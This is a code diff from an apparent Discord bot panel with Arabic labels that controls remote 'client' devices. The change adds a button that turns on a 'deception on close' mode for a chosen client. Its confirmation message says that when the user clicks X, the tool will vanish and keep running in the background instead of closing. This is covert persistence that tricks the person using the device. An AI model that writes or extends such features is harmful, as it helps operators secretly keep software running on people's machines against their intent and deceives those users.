@@ -343,15 +343,18 @@ class DeviceActionsView(discord.ui.View):
     async def send_msg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(SendMsgModal(self.code))
 
-    @discord.ui.button(label="👻 إخفاء الواجهة يدويًا", style=discord.ButtonStyle.secondary, custom_id="dev_act_stealth", row=3)
-    async def stealth_mode_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="👻 تفعيل الخداع عند الإغلاق (للعميل)", style=discord.ButtonStyle.secondary, custom_id="dev_act_enable_stealth_close", row=3)
+    async def enable_stealth_close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
-            if "remote_stealth" not in db: db["remote_stealth"] = {}
-            db["remote_stealth"][self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Enable stealth mode for {self.code}"):
-                await interaction.followup.send("👻 تم إرسال أمر إخفاء الواجهة! ستختفي نافذة العميل الآن وتبقى تعمل بالخلفية.", ephemeral=True)
+            if "stealth_close_codes" not in db: db["stealth_close_codes"] = []
+            if self.code not in db["stealth_close_codes"]:
+                db["stealth_close_codes"].append(self.code)
+            if save_db(db, sha, url, headers, f"Enable stealth close for {self.code}"):
+                await interaction.followup.send(f"👻 تم تفعيل وضع الخداع عند الإغلاق للعميل `{self.code}` بنجاح! إذا ضغط على X الآن، ستختفي الأداة وتعمل بالخلفية بدلاً من أن تُغلق.", ephemeral=True)
+            else:
+                await interaction.followup.send("❌ فشل الحفظ في السحابة.", ephemeral=True)
 
     @discord.ui.button(label="🛑 إغلاق البرنامج كلياً", style=discord.ButtonStyle.danger, custom_id="dev_act_force_close", row=3)
     async def force_close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
